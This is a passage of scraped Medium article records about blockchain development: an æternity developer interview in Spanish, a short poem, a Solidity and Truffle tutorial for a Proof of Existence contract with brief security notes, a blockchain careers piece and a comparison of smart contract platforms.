trae su naturaleza relajada pero dedicada al proyecto \u00e6ternity y es conocido por muchos por su deseo y capacidad de seguir adelante. Recientemente, nos sentamos con \u00e9l para preguntarle sobre su punto de vista sobre la programaci\u00f3n funcional, consensus y si Blockchain realmente cambiar\u00e1 el mundo.\u00bfQu\u00e9 te trajo al\u00a0equipo?Al tener una formaci\u00f3n acad\u00e9mica, haber trabajado con sistemas distribuidos y haber impartido cursos de criptograf\u00eda, fue natural para m\u00ed tener al menos un breve inter\u00e9s en el surgimiento de la tecnolog\u00eda blockchain. Sin embargo, durante varios a\u00f1os estuve demasiado ocupado con el trabajo y la familia como para explorarlo en detalle.Esto cambi\u00f3 cuando me presentaron el proyecto \u00e6ternity. Parec\u00eda una oportunidad incre\u00edble para construir la siguiente generaci\u00f3n blockchain en Erlang.\u00bfQu\u00e9 es lo que m\u00e1s te interesa de blockchain?Encuentro la naturaleza descentralizada muy interesante.Me gusta la idea de que blockchain simplemente existe; nadie est\u00e1 \u201cejecut\u00e1ndola\u201d.S\u00ed, por supuesto que hay una comunidad, y la mayor\u00eda de los cambios que experimenta incluyen alguna versi\u00f3n de consensus. Pero, al final del d\u00eda, es el propio c\u00f3digo que ejecuta la mayor\u00eda de los participantes lo que define la cadena.\u00bfCrees que blockchain tiene el potencial de cambiar el\u00a0mundo?Esta es una pregunta que a menudo recibo de amigos cuando escuchan que estoy involucrado en un proyecto blockchain. Por lo general, les digo que creo que algunas, quiz\u00e1s unas pocas, de las blockchains existentes persistir\u00e1n y ser\u00e1n bloques de construcci\u00f3n realmente \u00fatiles en la tecnolog\u00eda futura. Sin embargo, no estoy tan seguro de que, en s\u00ed misma, cambiar\u00e1 el mundo. En cierto sentido, podr\u00eda hacerlo porque permite que se construya sobre ella un servicio innovador. Pero queda por verse c\u00f3mo eso podr\u00eda suceder.\u00bfCu\u00e1l es tu cosa favorita de Erlang como lenguaje de programaci\u00f3n?\u00bfSolo puedo elegir una? Para m\u00ed, tiene que ser su sintaxis moderna y concisa\u2026 \u00a1S\u00f3lo bromeo! Pero en serio, aparte de su incomparable modelo de concurrencia, lo que normalmente me gusta m\u00e1s es que puedo ser realmente productivo. El lenguaje funcional y din\u00e1micamente escrito tambi\u00e9n ayuda mucho. Habiendo escrito programas imperativos largos y luchado contra el comprobador de tipos de Haskell, esta caracter\u00edstica es muy valiosa para m\u00ed.\u00bfCu\u00e1l es el mayor desaf\u00edo de tu trabajo en este\u00a0momento?El mayor desaf\u00edo para \u00e6ternity es la aceptaci\u00f3n. Claro, podemos desarrollar y mejorar muchas cosas. Pero necesitamos educar a las personas y hacer que comprendan y amen los conceptos que ya tenemos. Nuestro lenguaje contractual es un excelente ejemplo de esto. Es diferente en comparaci\u00f3n con Solidity, por ejemplo. Pero es diferente por una raz\u00f3n y, si me preguntas, es diferente de una manera muy buena. Hay menos posibilidades de que te dispares en el pie con Sophia, pero a\u00fan puedes hacerlo si realmente lo deseas.Al final me gusta que hayamos hecho un lenguaje m\u00e1s seguro sin limitar su expresividad.\u00bfQu\u00e9 consejo le dar\u00edas a alguien sobre esta tecnolog\u00eda?Este negocio est\u00e1 lleno de personas paranoicas: personas que pueden llamar a algo una estafa r\u00e1pidamente en cuanto ven algo que no entienden completamente. Probablemente por buenas razones, ya ha habido demasiados proyectos dudosos. Pero mi consejo ser\u00eda tomar tres respiraciones profundas, asegurarte de que entiendes lo que est\u00e1s viendo y tomar tus propias decisiones sobre las cosas.Fuera del trabajo, \u00bfc\u00f3mo podr\u00eda un amigo describir tu personalidad?Algunos amigos dir\u00edan que me importa demasiado el f\u00fatbol, \u200b\u200bpero es bueno tener algo no t\u00e9cnico en el que concentrarme de vez en cuando.\u00a0;)", "responses": ""}, {"title": "SOLIDITY", "author_name": "Stephen C. Rose", "link": "https://medium.com/everything-comes/solidity-121fe279c38f?source=search_post", "post_date": "May 5", "readtime": "", "upvotes": "20", "content": "COMING AND\u00a0GOINGSOLIDITYStephen C. RoseBlockedUnblockFollowFollowingMay 5Solidity I\u2019ll give you solid hereOh yes I didI put my finger through itIt\u2019s yours not mine+Solidity you say it must appearOK OKWhy are you so insistentOK that\u2019s fine+You say you want to write it up just nowWhy such a rushYou\u2019re thinking it might vanishThat\u2019s a good sign", "responses": ""}, {"title": "The Hitchhiker\u2019s Guide to Smart Contracts in\u00a0Ethereum", "author_name": "Manuel Araoz", "link": "https://blog.zeppelin.solutions/the-hitchhikers-guide-to-smart-contracts-in-ethereum-848f08001f05?source=search_post", "post_date": "Jul 29, 2016", "readtime": "13 min read", "upvotes": "6.1K", "content": "The Hitchhiker\u2019s Guide to Smart Contracts in\u00a0EthereumManuel AraozBlockedUnblockFollowFollowingJul 29, 2016Updated Oct 6th 2017, for Truffle v3.4.11 and Solidity v0.4.15.I\u2019ve been working with smart contracts for 4 years, mainly in the Bitcoin blockchain. Some projects I participated in are Proof of Existence, bitcore, and Streamium. In the past months, I\u2019ve been exploring and working with the Ethereum platform.I\u2019ve decided to compile a short guide to ease the way of future programmers learning Ethereum smart contract development. I\u2019ve divided the guide in two sections: how to get started building smart contracts in Ethereum, and a quick note on smart contract security.Getting started with Smart Contracts on\u00a0Ethereum0. Basic\u00a0ConceptsThis guide assumes you have a basic level of technical understanding on how cryptocurrencies and blockchains work. If you don\u2019t, I recommend skimming over Andreas Antonopoulos\u2019 Mastering Bitcoin book, Consensys\u2019 \u201cJust Enough Bitcoin for Ethereum\u201d guide, or at least watching this short video by Scott Driscoll. To continue ahead you should know what a public and private key are, why a blockchain needs miners, how decentralized consensus is reached, what a transaction is, and the concepts of transaction scripting and smart contracts.Two other important and related concepts you\u2019ll need to understand before working with Ethereum are the Ethereum Virtual Machine and gas.Ethereum was designed as a smart contract platform. Its origin is actually linked to a critique made by Vitalik Buterin on bitcoin as a very limited smart contract platform. The Ethereum Virtual Machine (EVM) is where smart contracts run in Ethereum. It provides a more expressive and complete language than bitcoin for scripting. In fact, it is a Turing Complete programming language. A good metaphor is that the EVM is a distributed global computer where all smart contracts are executed.Given that smart contracts run in the EVM, there must be a mechanism to limit the resources used by each contract. Every single operation that is executed inside the EVM is actually simultaneously executed by every node in the network. This is why gas exists. An Ethereum transaction contract code can trigger data reads and writes, do expensive computations like using cryptographic primitives, make calls (send messages) to other contracts, etc. Each of these operations have a cost measured in gas, and each gas unit consumed by a transaction must be paid for in Ether, based on a gas/Ether price which changes dynamically. This price is deducted from the Ethereum account sending the transaction. Transactions also have a gas limit parameter that is an upper bound on how much gas the transaction can consume, and is used as a safe-guard against programming errors that could deplete an account\u2019s funds. You can read more about gas here.1. Setting up your environmentSo, you know the basics, let\u2019s set everything up to code! To start developing Ethereum apps (or DApps, for decentralized applications, as many people like to call them), you\u2019ll need a client to connect to the network. It will act as your window to the distributed network, and provide a view of the blockchain, where all the EVM state is represented.There are various compatible clients for the protocol, the most popular being geth, a Go language implementation. However, it\u2019s not the most developer-friendly. The best option I\u2019ve found is the testrpc node (yes, the name sucks). Trust me, it will save you a lot of time. Install it and run it (you may need to prepend sudo depending on your setup):$ npm install -g ethereumjs-testrpc$ testrpcYou should run testrpc in a new terminal and leave it running while you develop. Each time you run testrpc, it will generate 10 new addresses with simulated test funds for you to use. This is not real money and you\u2019re safe to try anything with no risk of losing funds.The most popular language for writing smart contracts in Ethereum is Solidity, so we\u2019ll be using that. We\u2019re also using the Truffle development framework, which helps with smart contract creation, compiling, deployment and testing. Let\u2019s start (again, you may need to prepend sudo depending on your setup):# First, let's install truffle$ npm install -g truffle# let's setup our project$ mkdir solidity-experiments$ cd solidity-experiments/$ truffle init Truffle will create all the files for an example project, including contracts for MetaCoin, a sample token contract.\u00a0You should be able to compile the example contracts by running truffle compile. Then, to deploy the contracts to the simulated network using the testrpc node we have running, you need to run truffle migrate:$ truffle compileCompiling ConvertLib.sol...Compiling MetaCoin.sol...Compiling Migrations.sol...Writing artifacts to ./build/contracts$ truffle migrateUsing network 'development'.Running migration: 1_initial_migration.js  Deploying Migrations...  ... 0x686ed32f73afdf4a84298642c60e2002a6d0d736a5478cc8cb22a655ac018a67  Migrations: 0xa7edbac1156f98907a24d18df8104b5b1bd7027cSaving successful migration to network...  ... 0xe3bf1e50d2262d9ffb015091e5f2974c8ebe0d6fd0df97a7dbcde8a0e51c694aSaving artifacts...Running migration: 2_deploy_contracts.js  Deploying ConvertLib...  ... 0x2e0e6718f01d0da6da2ada13d6e4ad662c5a20e784e04c404e9d4ef1d392bdae  ConvertLib: 0xf4388ce4d4ce8a443228d65ecfa5149205db049f  Linking ConvertLib to MetaCoin  Deploying MetaCoin...  ... 0xb03a3cde0672a2bd4dda6c01dd31641d95bd680c4e21162b3370ed6db7a5620d  MetaCoin: 0x4fc68713f7ac86bb84ac1ef1a09881a9b8d4100fSaving successful migration to network...  ... 0xb9a2245c27ff1c6506c0bc6349caf86a31bc9f700388defe04566b6d237b54b6Saving artifacts...Note to Mac OS X users: Truffle is sometimes confused by\u00a0.DS_Store files. If you get an error mentioning one of those files, just delete it.We just deployed the sample contracts to our testrpc node. Wohoo! That was easy, right? Time to create our own contract now!2. Writing your first Ethereum smart\u00a0contractIn this guide we\u2019ll be writing a simple Proof of Existence smart contract. The idea is to create a digital notary that stores hashes of documents as proofs of their existence. Use truffle create contract to get started:$ truffle create contract ProofOfExistence1Now open contracts/ProofOfExistence1.sol in your favorite text editor (I use vim with Solidity syntax highlighting), and paste this initial version of the code:pragma solidity ^0.4.15;// Proof of Existence contract, version 1contract ProofOfExistence1 {  // state  bytes32 public proof;  // calculate and store the proof for a document  // *transactional function*  function notarize(string document) {    proof = proofFor(document);  }  // helper function to get a document's sha256  // *read-only function*  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }}We\u2019ll start with something simple but incorrect and move towards a better solution. This is a definition of a Solidity contract, which is like a class in other programming languages. Contracts have state and functions. It is important to distinguish two kinds of functions that can appear in a contract:Read-only (constant) functions: functions that don\u2019t perform any state changes. They only read state, perform computations, and return values. As these functions can be resolved locally by each node, they cost no gas. Marked with the keyword constant.Transactional functions: functions that perform a state change in the contract or move funds. As these changes need to be reflected in the blockchain, transactional function execution requires sending a transaction to the network and spending gas.Our contract above has one of each kind, marked in the documentation. We\u2019ll see how the kind of function we\u2019re using with modifies how we interact with the smart contract in the next section.This simple version only stores one proof at a time, using the data type bytes32, or 32 bytes, which is the size of a sha256 hash. The transactional function notarize allows one to store the hash of a document in our smart contract\u2019s state variable proof. Said variable is public, and is the only way a user of our contract has to verify if a document has been notarized. We\u2019ll do that ourselves shortly, but first\u2026Let\u2019s deploy ProofOfExistence1 to the network! This time, you\u2019ll have to edit the migration file (migrations/2_deploy_contracts.js) to make Truffle deploy our new contract. Replace the contents with the following:var ProofOfExistence1 = artifacts.require(\"./ProofOfExistence1.sol\");module.exports = function(deployer) {  deployer.deploy(ProofOfExistence1);};To run this migration again, you\u2019ll need to use the reset flag, to make sure it runs again.truffle migrate --resetMore on how Truffle migrations work can be found here.3. Interacting with your smart\u00a0contractNow that our contract is deployed, let\u2019s play with it! We can send messages to it via function calls and read its public state. We\u2019ll use the Truffle console for that:$ truffle console// get the deployed version of our contracttruffle(default)> var poe = ProofOfExistence1.at(ProofOfExistence1.address)// and print its address truffle(default)> poe.address0x3d3bce79cccc331e9e095e8985def13651a86004// let's register our first \"document\"truffle(default)> poe.notarize('An amazing idea'){ tx: '0x18ac...cb1a',  receipt:    { transactionHash: '0x18ac...cb1a',     ...   },  logs: [] }// let's now get the proof for that documenttruffle(default)> poe.proofFor('An amazing idea')0xa3287ff8d1abde95498962c4e1dd2f50a9f75bd8810bd591a64a387b93580ee7// To check if the contract's state was correctly changed:truffle(default)> poe.proof()0xa3287ff8d1abde95498962c4e1dd2f50a9f75bd8810bd591a64a387b93580ee7// The hash matches the one we previously calculatedFirst thing we do is obtain a representation of our deployed contract and store it in a variable called poe.We then call the transactional function notarize, which involves a state change. When we call a transactional function, we get a Promise that resolves to a transaction object, not what the actual function returns. Remember that to change the EVM state we need to spend gas and send a transaction to the network. That\u2019s why we get a transaction information object as the result of the Promise, referring to the transaction that did this state change. In this case, we are not interested in the transaction id, so we just discard the Promise. When writing a real app, we\u2019ll want to save it to check the resulting transaction and catch errors.Next, we call the read-only (constant) function proofFor. Remember to mark your read-only functions with the keyword constant, or else Truffle will try to craft a transaction to execute them. This is a way to tell Truffle that we\u2019re not interacting with the blockchain but just reading from it. By using this read-only function, we obtain the sha256 hash of the \u2018An amazing idea\u2019 \u201cdocument\u201d.We now need to contrast this with the state of our smart contract. To check if the state changed correctly, we need to read the proof public state variable. To get the value of a public state variable, we can call a function of the same name, which returns a Promise of its value. In our case, the output hash is the same, so everything worked as expected\u00a0:)For more info on how to interact with contracts, read this section of the Truffle documentation.As you can see from the snippet above, our first version of the Proof of Existence smart contract seems to be working! Good work! It\u2019s only good for registering one document at a time, though. Let\u2019s create a better version.4. Iterating the contract\u00a0codeLet\u2019s change the contract to support multiple document proofs. Copy the original file with the name contracts/ProofOfExistence2.sol and apply these changes. The main changes are: we change the proof variable into a bytes32 array and call it proofs, we make it private, and we add a function to check if a document has already been notarized by iterating that array.pragma solidity ^0.4.15;// Proof of Existence contract, version 2contract ProofOfExistence2 {  // state  bytes32[] private proofs;  // store a proof of existence in the contract state  // *transactional function*  function storeProof(bytes32 proof) {    proofs.push(proof);  }// calculate and store the proof for a document  // *transactional function*  function notarize(string document) {    bytes32 proof = proofFor(document);    storeProof(proof);  }// helper function to get a document's sha256  // *read-only function*  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }// check if a document has been notarized  // *read-only function*  function checkDocument(string document) constant returns (bool) {    bytes32 proof = proofFor(document);    return hasProof(proof);  }  // returns true if proof is stored  // *read-only function*  function hasProof(bytes32 proof) constant returns (bool) {    for (uint256 i = 0; i < proofs.length; i++) {      if (proofs[i] == proof) {        return true;      }    }    return false;  }}Let\u2019s interact with the new functions: (remember to update migrations/2_deploy_contracts.js to include the new contract and run truffle migrate --reset)// deploy contractstruffle(default)>  migrate --reset// Get the new version of the contracttruffle(default)> var poe = ProofOfExistence2.at(ProofOfExistence2.address)// let's check for some new document, and it shouldn't be there.truffle(default)> poe.checkDocument('hello')false// let's now add that document to the proof storetruffle(default)> poe.notarize('hello'){ tx: '0x1d2d...413f',  receipt: { ... },  logs: []}// let's now check again if the document has been notarized!truffle(default)> poe.checkDocument('hello')true// success!// we can also store other documents and they are recorded tootruffle(default)> poe.notarize('some other document');truffle(default)> poe.checkDocument('some other document')trueThis version is better than the first, but still has some problems. Note that every time we want to check if a document was notarized, we need to iterate through all existing proofs. This makes the contract spend more and more gas on each check as more documents are added. A better structure to store proofs is a map. Luckily, Solidity supports maps, and calls them mappings. Another thing we\u2019ll improve in this version is removing all that extra comments marking read-only or transactional functions. I think you get it by now\u00a0:)Here\u2019s the final version, which should be pretty easy to understand because you followed along previous versions:pragma solidity ^0.4.15;// Proof of Existence contract, version 3contract ProofOfExistence3 {  mapping (bytes32 => bool) private proofs;  // store a proof of existence in the contract state  function storeProof(bytes32 proof) {    proofs[proof] = true;  }  // calculate and store the proof for a document  function notarize(string document) {    var proof = proofFor(document);    storeProof(proof);  }  // helper function to get a document's sha256  function proofFor(string document) constant returns (bytes32) {    return sha256(document);  }  // check if a document has been notarized  function checkDocument(string document) constant returns (bool) {    var proof = proofFor(document);    return hasProof(proof);  }  // returns true if proof is stored  function hasProof(bytes32 proof) constant returns(bool) {    return proofs[proof];  }}That looks good enough. And it works exactly as the 2nd version. To try it out, remember to update the migration file and run truffle migrate --reset again. All the code in this tutorial can be found in this GitHub repo.5. Deploying to the real testnet\u00a0networkOnce you\u2019ve tested your contract extensively using testrpc in the simulated network, you\u2019re ready to try it in the real network! To do that, we need a real testnet/livenet Ethereum client. Follow these instructions to install geth.During development, you should run nodes in testnet mode, so that you can test everything out without risking real money. Testnet mode (also known as Morden in Ethereum) is basically identical to the real Ethereum, but the Ether token there has no monetary value. Don\u2019t be lazy and remember to always develop in testnet mode, you will regret it if you lose real Ether due to a programming error (trust me on that, hehe).Run geth in testnet mode, with RPC server enabled:geth --testnet --rpc console 2>> geth.logThis will open a console where you can type in basic commands to control your node/client. Your node will begin downloading the testnet blockchain, and you can check progress by checking eth.blockNumber. While the blockchain is downloading, you can still run commands. For example, let\u2019s create an account: (remember the password!)> personal.newAccount()Passphrase:Repeat passphrase:\"0xa88614166227d83c93f4c50be37150b9500d51fc\"Let\u2019s send some coins there and check the balance. You can get free testnet Ether here. Just copy-paste the address you just generated and this faucet will send you some testnet Ether. To check you balance, run:> eth.getBalance(eth.accounts[0])0It will show no balance because your node hasn\u2019t synced with the rest of the network yet. While you wait for that, check your balance in a testnet block explorer. There, you can also see the current testnet highest block number (#1819865 at the time of writing), which you can use in combination with eth.blockNumber to know when your node has synced completely.Once your node has synced, you\u2019re ready to deploy the contracts to the testnet using Truffle. First, unlock your main geth account, so that Truffle can use it. And be sure that it holds some balance, or you won\u2019t be able to push a new contract to the network. On geth run:> personal.unlockAccount(eth.accounts[0], \"mypassword\", 24*3600)true> eth.getBalance(eth.accounts[0])1000000000000000000Ready to go! If some of these two are not working for you, check the steps above and make sure you\u2019ve completed them correctly. Now run:$ truffle migrate --resetNote that this time, it will take longer to complete, as we\u2019re connecting to the actual network and not one simulated by testrpc. Once it completes, you can interact with the contract using the same approach as before.The testnet-deployed version of ProofOfExistence3 can be found at the address 0xcaf216d1975f75ab3fed520e1e3325dac3e79e05. (Feel free to interact with it and send your proofs!)I\u2019ll leave the details on how to deploy to the live network to the reader. You should only do this once you\u2019ve extensively tested your contracts in simulated and test networks. Remember any programming error can result in monetary loss in the livenet!Smart Contract security in Ethereum is\u00a0hard\u201cSmart contracts are pretty difficult to get right.\u201d Emin G\u00fcn SirerGiven that by nature, smart contracts are computer code that define how money moves, I couldn\u2019t end this guide without even a small note on security. I\u2019ll be talking about smart contract security in much more depth at future posts (edit: like this one), but here are some quick notes to get you started.Some problems you should be aware of (and avoid):Reentrancy: Do not perform external calls in contracts. If you do, ensure that they are the very last thing you do.Send can fail: When sending money, your code should always be prepared for the send function to fail.Loops can trigger gas limit: Be careful when looping over state variables, which can grow in size and make gas consumption hit the limits.Call stack depth limit: Don\u2019t use recursion, and be aware that any call can fail if stack depth limit is reached. EDIT: this is no longer a problem.Timestamp dependency: Do not use timestamps in critical parts of the code, because miners can manipulate them.These are provided just as examples of unexpected behaviors that can lead for theft or destruction of funds in your smart contract. The moral is: if you\u2019re writing smart contracts, you\u2019re writing code that handles real money. You should be very careful! Write tests, do code reviews, and audit your code.The best way to avoid obvious security problems is to have a solid understanding of the language. I recommend you read the Solidity documentation if you have the time. We still need better tools for acceptable smart contract security. (Edit: close to the original publishing of this post, we launched the OpenZeppelin library, and we\u2019ve recently announced zeppelinOS.", "responses": "79"}, {"title": "Why You Should Learn to Build Blockchain Apps", "author_name": "Georgios Konstantopoulos", "link": "https://medium.com/loom-network/why-you-should-learn-to-build-blockchain-apps-be9a92e8d08e?source=search_post", "post_date": "Feb 16, 2018", "readtime": "6 min read", "upvotes": "5.8K", "content": "Why You Should Learn to Build Blockchain AppsGeorgios KonstantopoulosBlockedUnblockFollowFollowingFeb 16, 2018Last week we released CryptoZombies Lesson 4, where we continue our journey to build an army of zombies with Solidity, Ethereum\u2019s programming language. As of this lesson, over 90,000 people have used CryptoZombies and are getting more familiar with developing Decentralized Applications (DApps) on Ethereum.What we have not discussed so far is why should you get involved in this space? What is there to gain? Does it really matter?The one sure thing is that demand for Blockchain Developers (often called Blockchain Engineers) exceeds the supply by far, and this demand is increasing over time:Blockchain and Bitcoin were 2 of the top 3 fastest-growing skills on Upwork\u2019s Quarterly Skills Index in\u00a02017.In this article, we\u2019re going to look at similar historical growth of innovative platforms, and some ways you can start making money as a blockchain developer as you develop your skillset.Lessons from the past: Google Play and Apple\u2019s App\u00a0StoreLet\u2019s take some data from the two biggest app stores of today, Google\u2019s Google Play and Apple\u2019s App Store.In March 2009 the Google Play store (called Android Market at the time) had 2,300 apps available. By the end of October 2010 that number had increased to 100,000[1]. In February 2017 the amount of apps on Google Play store was around in the range of 2.7 million.App Store exhibited similar growth:App Store growth 2008\u20132017 | source: https://www.statista.com/statistics/263795/number-of-available-apps-in-the-apple-app-store/Will history repeat\u00a0itself?If blockchain really is analogous to the internet in the early 90s, then DApps are in an analogous stage to the early-days of the app stores. We are going to see massive growth in DApp software developers over the coming years.I will take a phrase from Wikipedia\u2019s App Store (iOS) page,The term app has become a popular buzzword; in January 2011, app was awarded the honor of being 2010\u2019s \u201cWord of the Year\u201d [1]\u2026and make a bold prediction and adapt it to the DApp ecosystem:The term DApp has become a popular buzzword; in January 2019, DApp was awarded the honor of being 2018\u2019s \u201cWord of the\u00a0Year\u201dWhat actually matters here is not if the above happens. It is when.Should you really look into\u00a0this?If you are excited by:DecentralizationWorking with brilliant passionate mindsInnovationCutting-edge technologyHigh salaries (this happens mainly due to demand being much higher than available supply)\u2026then you should get familiar with blockchain development. Currently individuals, startups and even larger companies[2][3] are gradually joining the blockchain industry with their own products and they are actively looking for more employees to join their projects.Ways to make money as a blockchain developerThere are a number of ways you can start making money building DApps, depending on your current skill level.1. Build your own DApp and monetize\u00a0itTaking CryptoKitties as an example, you can build a monetized DApp. There is huge potential here\u200a\u2014\u200aCryptoKitties did over $12 million USD in sales in its first month after launch.If you look on DappRadar, you can see the volume of transactions different DApps are doing, with CryptoCountries currently topping the list at almost $40,000,000 in sales over the past 7 days. The developers take 2\u20135% of every transaction, so you can do the math and see what a profitable opportunity building your own DApp-based game can be.In our next article, we\u2019ll be covering in-depth the different business models you can use in your DApps to generate profits.2. Get paid for contributing to open-source projectsGitcoin aims to \u2018push open source forward\u2019 by attaching bounties denominated in Ether for solving github issues. Currently, there are more than $8.000 attached among 20 bounties, waiting to be claimed!All you need to do is solve an issue, and if the bounty submitter approves it, you will get paid in Ether via a smart contract.How does Gitcoin work? | https://gitcoin.co3. Create your own own Startup / CryptocurrencyLaunching an Ethereum token that is secure and can be used to trade value is as trivial as writing a few lines of code, thanks to OpenZeppelin. After you develop the coin, you can raise capital through an Initial Coin Offering (ICO).MVP of GustavoCoin in 10 lines of Code | https://blog.zeppelin.solutions/how-to-create-token-and-initial-coin-offering-contracts-using-truffle-openzeppelin-1b7a5dae99b6Of course, your project must have some kind of value in order to raise the required capital. (Or not, as has been the case with many high-profile ICOs\u200a\u2014\u200abut that is another discussion).4. Work at a\u00a0startupIf building your own startup isn\u2019t your thing, you can get hired as a developer on someone else\u2019s. There are a number of new projects springing up all the time that are looking for developers. Many of these projects raise millions of dollars via an ICO, and have a large budget for hiring skilled developers.You can take a quick look at AngelList and apply for a position that interests you.https://angel.co/blockchains/jobsBecause blockchain developers are in such high demand, many of these offer working remotely, which is a big plus for many.5. Work as a freelancerIf you prefer flexible and on-demand gigs, popular freelancing sites such as upwork.com or freelancer.com have job listings on potential projects that you can work part-time or on a per-project basis.You can search for positions such as Solidity Developer or Blockchain Engineer at these sites to grasp an idea of what positions are available.6. Join a larger\u00a0companyLots of big companies hire from time to time, trying to explore their own corporate solution.Visa job listing at\u00a0LinkedInHowever, judging by Visa asking for 8 years of Industry experience, then you\u2019re either Satoshi Nakamoto or drinking margaritas on your private island.Usually these jobs are not oriented towards fully public and decentralized systems, so if you\u2019re a blockchain purist, this may not be your cup of tea.OK, I\u2019m sold. How do I get\u00a0started?As more and more resources on learning to code these unstoppable applications become publicly available, aspiring developers will be able to transition smoothly from traditional development to blockchain development.At Loom Network, we are contributing to this effort by building a community around tools and tutorials for learning to build DApps on Ethereum, the fastest-growing blockchain developer platform.Here\u2019s how we recommend you get started:Head to CryptoZombies.io, our interactive code school that teaches you to write Ethereum DApps through building your own crypto-collectables game.Join our Telegram community to join a thriving community of people talking about DApp development and scaling Ethereum.Check out our Medium page for our other articles on Solidity development.Hope to see you in our community, with the other developers who are on the forefront of this industry!", "responses": "8"}, {"title": "Comparison of Smart Contract Platforms", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/comparison-of-smart-contract-platforms-2796e34673b7?source=search_post", "post_date": "Mar 5, 2018", "readtime": "10 min read", "upvotes": "2.8K", "content": "Comparison of Smart Contract PlatformsMichiel MuldersBlockedUnblockFollowFollowingMar 5, 2018Ivy-lang, Plutus, Solidity, Scrypto, Michelson, Hoon, Rust,\u00a0\u2026You serious??When should I find the time to explore all these languages? Most of them are barely used, making it incredibly hard to adopt them. Solidity is leading the pack, although, it\u2019s not an easy language to get started with. This article will criticize and give new insights in the following platforms: Ethereum, Hyperledger Fabric, NEM, Stellar, iOlite, Neblio, and Lisk.Source: www.tenor.comTo give you an overview of all different existing smart contract platforms:Source: www.github.comFinding The Right Smart Contract\u00a0PlatformI will feature some existing smart contract platforms and some upcoming ones. I\u2019ve selected these based on maturity, flexibility and the innovation they add to our ecosystem.Ethereum\u200a\u2014\u200aOld but\u00a0GoldEthereum is always a safe bet. Ethereum is a gold standard in the world of smart contracts and has the biggest capitalization among other platforms. The majority of token sales happen on the Ethereum platform, using the ERC-20 token standard.However, this standard has some serious bugs which have already led to major losses in the industry. Let me explain this.ERC-20 assumes two ways of performing a token transaction:1. transfer(): Send tokens to someone\u2019s address.2. approve() + transferFrom(): Deposit tokens to a smart contract.But what if you use transfer() to send tokens to a smart contract by accident? The transaction will succeed but this transaction will not be recognized by the recipient contract.\u201cFor example, if you send tokens to a decentralized exchange contract, then the exchange contract will receive your tokens but it will not credit these tokens to your exchange token balance. Moreover, if the decentralized exchange contract does not implement an emergency token extraction function, then it\u2019s impossible to get your tokens back in any case, resulting in a permanent loss of the tokens. Due to this bug, the Ethereum ecosystem has lost millions of dollars already.\u201dMy all-time favorite GIF\u200a\u2014\u200aSource.This information is provided by Reddit user u/Dexaran (source article), creator of the ERC223 standard. Dexaran is the first developer who has notified the Ethereum community about the aforementioned bug. In response to this, he has created the ERC223 standard.Most developers are not aware of this ERC223 and ERC77 standard. To give a short comparison of both standards:ERC223: This improved standard resolves the ERC20 critical bug by making the transfer() function throw an error on invalid transfers and canceling the transaction so no funds are lost. \u2192 Focussed on security.ERC777: Solves ERC20\u2019s problems, such as lack of transaction handling mechanisms. \u2192 Focussed on mainstream adoption.As you can see, the community still has to grow in terms of adopting more secure/better token standards.NEMScalability is the most critical thing about NEM\u2019s decentralized application. While ETH does a maximum of 15 transactions per second, NEM reportedly manages hundreds of transactions per second. The NEM foundation has given security and availability a priority so entrepreneurs deal with other problems and not technical difficulties.While NEM is reportedly the faster, safer and easier technology, Ethereum provides a broader base for the creation of custom DApps. The main difference is that ETH applies its Smart Contracts on the Blockchain, while NEM uses code off the blockchain. Although this might arguably make it less decentralized, the method does have its benefits, such as better security, easier updates, faster execution times and lighter code.Reddit user Nemario told me that the contract code can be updated at any time, all without any interaction with the chain. It is not possible to execute reverse transactions. This makes NEM less decentralized in one way, but on-chain security features like multi-sig and smart assets mitigate this \u2018problem\u2019.NEM has customized data management apps called smart assets through which you can create tokens, data records, voting systems and other coins with just a few clicks. Where Ethereum is targeting companies intend to rebuild internal networks in the next 5 to 10 years, NEM is targeting companies looking for a fast, secure, and ready to use and handle solution that\u2019s current. It will be interesting to see which companies adopt NEM over Ethereum. Source: www.cashtechnews.comNEM provides several SDKs, below you can find a NodeJS snippet of a transfer transaction.Hyperledger FabricHyperledger Fabric (HLF) likes to call its smart contracts \u2018chaincode\u2019. HLF is an enterprise permissioned blockchain, built with great flexibility, which makes it very useful for businesses as their business rules change after approximately 7 years. Most other blockchains are not built considering flexibility.Hyperledger Fabric itself was written on Go language, so its smart contracts support this language as well. Benefits? Golang is a very efficient language with a fast compile time.In my opinion, writing chaincode is simple. The three most important functions are:PutState: Create new asset or update existing one.GetState: Retrieve asset.GetHistoryForKey\u00a0: Retrieve history of changes.DelState: \u2018Delete\u2019 asset.Note on DelState: HLF uses a state database that stores keys and their values. This is different from the sequence of blocks that make up the blockchain. A key and its associated value can be removed from the state database using the DelState function. However, this does not mean that there is an alteration of blocks on the blockchain.The removal of a key and value would be stored as a transaction on the blockchain just as the prior addition and any modifications were stored as transactions on the blockchain.The history of a key can be retrieved after the key is deleted. There is a GetHistoryForKey() function that retrieves the history and part of its response is an IsDeleted flag that indicates if the key was deleted. It would be possible to create a key, delete the key, and then create the key again; the GetHistoryForKey() function would track such a case.Example chaincode:Stellar Smart ContractsStellar smart contracts (SSC) are much different from Ethereum smart contracts. They are not Turing complete and are implemented as an agreement between multiple parties and enforced by transactions. Below you see a comparison between Stellar and Ethereum. Notice the huge difference in cost and confirmation time. A single transaction on the Stellar network costs only ~$0.0000002!Source: https://www.stellar.org/blog/using-stellar-for-ico/SSCs can be written in any language the Stellar community provides an API for (JavaScript, Python, Golang, PHP,\u00a0\u2026). You can find an example of a smart contract in PHP here.An SSC is expressed as compositions of transactions that are connected and executed using various constraints. The following are examples of constraints that can be considered and implemented when creating SSCs (from Stellar documentation):Multisignature\u200a\u2014\u200aWhat keys are needed to authorize a certain operation? What parties need to agree on a circumstance in order to execute the steps?Multisignature is the concept requiring signatures of multiple parties to sign transactions stemming from an account. Through signature weights and thresholds, representation of power in signatures is created.Batching/Atomicity\u200a\u2014\u200aWhat operations must all occur together or fail? What must happen in order to force this to fail or pass?Batching is the concept of including multiple operations in one transaction. Atomicity is the guarantee that given a series of operations, upon submission to the network if one operation fails, all operations in the transaction fails.Sequence\u200a\u2014\u200aIn what order should a series of transactions be processed? What are the limitations and dependencies?The concept of sequence is represented on the Stellar Network through sequence number. Utilizing sequence numbers in transaction manipulation, it can be guaranteed that specific transactions do not succeed if an alternative transaction is submitted.Time Bounds\u200a\u2014\u200aWhen can a transaction be processed?Time bounds are limitations on the time period over which a transaction is valid. Using time bounds enables time periods to be represented in an SSC.Platforms Under ConstructionWe 